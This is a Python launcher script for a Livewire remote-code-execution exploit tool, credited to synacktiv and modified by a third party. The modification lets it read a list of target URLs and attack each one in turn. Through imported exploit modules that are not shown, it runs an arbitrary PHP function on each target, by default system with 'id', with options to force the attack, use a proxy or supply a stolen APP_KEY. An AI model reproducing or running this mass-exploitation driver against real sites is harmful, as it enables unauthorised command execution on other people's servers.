#!/usr/bin/env python3

import argparse
import warnings
import os
warnings.filterwarnings("ignore")

from exploit.exploit_appkey import ExploitWithAppKey
from exploit.exploit_wappkey import ExploitWithoutAppKey

def main():
    parser = argparse.ArgumentParser(description="Livewire exploit tool by synacktiv ||||| modded by https://umbra.by/L4663r666h05t")
    # Sekarang -u tidak wajib jika ada -l
    parser.add_argument("-u", "--url", help="Target URL", required=False)
    parser.add_argument("-l", "--list", help="Fill ur list - modded by mantanhacker | umbra.by/L4663r666h05t", required=False)

    parser.add_argument("-f", "--function", help="Function to execute (default: system)", default="system")
    parser.add_argument("-p", "--param", help="Param for function (default: id)", default="id")
    parser.add_argument("-H", "--headers", help="Headers to add to the request (default None)", default=None, action="append")
    parser.add_argument("-P", "--proxy", help="Proxy URL for requests", default=None)
    parser.add_argument("-a", "--app-key", help="APP_KEY to sign snapshot", default=None)
    parser.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
    parser.add_argument("-F", "--force", help="Force exploit even if version does not seems to be vulnerable", action="store_true")
    parser.add_argument("-c", "--check", help="Only check if the remote target is vulnerable", action="store_true")

    args = parser.parse_args()

    targets = []
    if args.list:
        if os.path.exists(args.list):
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"[*] Total {len(targets)} URL dimuat dari {args.list}")
        else:
            print(f"[ERROR] File {args.list} tidak ditemukan!")
            return
    elif args.url:
        targets = [args.url]
    else:
        print("[!] Error: Use -u for single URL or -l for list.txt")
        return

    for target_url in targets:
        print(f"\n" + "="*50)
        print(f"[*] Target: {target_url}")
        print("="*50)

        try:
            if args.app_key is not None:
                exploit = ExploitWithAppKey(
                    target_url, args.debug, args.function, args.param,
                    args.headers, args.proxy, args.app_key
                )
            else:
                exploit = ExploitWithoutAppKey(
                    target_url, args.debug, args.function, args.param,
                    args.headers, args.proxy, args.check, args.force
                )
            exploit.run()
        except Exception as e:
            print(f"[ERROR] {target_url}: {e}")
        except KeyboardInterrupt:
            print("\n[!] Cancel.")
            break

if __name__ == "__main__":
    main()
